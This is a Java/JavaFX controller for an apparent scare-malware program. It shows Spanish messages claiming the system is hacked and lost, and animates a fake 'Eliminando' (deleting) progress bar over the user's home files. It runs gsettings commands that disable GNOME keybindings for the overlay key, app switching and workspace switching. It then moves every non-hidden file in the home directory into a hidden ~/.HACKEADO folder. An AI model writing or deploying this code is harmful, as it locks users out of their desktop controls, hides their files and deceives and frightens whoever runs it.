package org.kaal.controller;

import java.io.File;
import java.io.IOException;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.ArrayList;
import java.util.Collections;

import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.concurrent.Task;
import javafx.fxml.FXML;
import javafx.scene.control.Label;
import javafx.scene.control.ProgressBar;

public class ControllerFX {
	

    @FXML
    private Label lblTitulo1;

    @FXML
    private Label lblTitulo2;
    
    @FXML
    private ProgressBar progressBarEvil;

    @FXML
    private Label lblprogress;
    
    
    public void initialize() throws IOException {
    	
    	ArrayList<String> listDisableKey = new ArrayList<String>();
    	listDisableKey.add("gsettings set org.gnome.mutter overlay-key ''");
    	listDisableKey.add("gsettings set org.gnome.desktop.wm.keybindings switch-applications ['']");
    	listDisableKey.add("gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-up ['']");
    	listDisableKey.add("gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-down ['']");
    	listDisableKey.add("gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-right ['']");
    	listDisableKey.add("gsettings set org.gnome.desktop.wm.keybindings switch-to-workspace-left  ['']");
    	
    	
    	String HOME =  System.getProperty("user.home");
    	
    	lblTitulo1.setText("Al parecer ha sido hackeado");
    	lblTitulo2.setText("Solo estoy aqui para informarle que su sistema esta perdido, que tenga un lindo dia");  
    	
    	strartProgress();
    	disableKeySystem(listDisableKey);
    	createFolderHidden(HOME,"HACKEADO");
    	moveFileToFolder(HOME, "HACKEADO");
    	
    	
    }
    
    
    
    
	private void disableKeySystem(ArrayList<String> listDisableKey) throws IOException {
				
    	for (String string : listDisableKey) {
			System.out.println(string);
			Runtime.getRuntime().exec(string);

		}
		
	}




	private void strartProgress() {
		String HOME =  System.getProperty("user.home");
		
		Task<Void> task = new Task<Void>() {

			@Override
			protected Void call() throws Exception {
					
				File file = new File(HOME);
				File[] listOfFile = file.listFiles();
				for (int i = 0; i < listOfFile.length; i++) {
					
					updateProgress(i+1,listOfFile.length);
					updateMessage(listOfFile[i].getAbsolutePath());
					Thread.sleep(1000);
				}
				return null;
			}
			
		};
		
		
		task.messageProperty().addListener(new ChangeListener<String>() {

			@Override
			public void changed(ObservableValue<? extends String> observable, String oldValue, String newValue) {
				lblprogress.setText("Eliminando: "+newValue);
			}
		});
		
		
		progressBarEvil.progressProperty().unbind();
		progressBarEvil.progressProperty().bind(task.progressProperty());
		
		Thread th = new Thread(task);
		th.setDaemon(true);
		th.start();
		
	}
	



	private void createFolderHidden(String directory, String folder) throws IOException {
		
        Path path = Paths.get(directory+"/."+folder);

        if (!Files.exists(path))
        	Files.createDirectory(path);
            	
	}
	
	
	private void moveFileToFolder(String directory, String folder) throws IOException {
		
		Path home = Paths.get(directory);
		Path target = Paths.get(directory+"/."+folder);

        Files.walkFileTree(home, Collections.emptySet(), 1, new SimpleFileVisitor<Path>() {
            @Override
            public FileVisitResult visitFile(Path source, BasicFileAttributes attrs) throws IOException {
            	
            	if(!Files.isHidden(source)) {

                	Files.move(source, target.resolve(source.getFileName()));
                } 
                return FileVisitResult.CONTINUE;
            }
        });  
 
	}

	
}
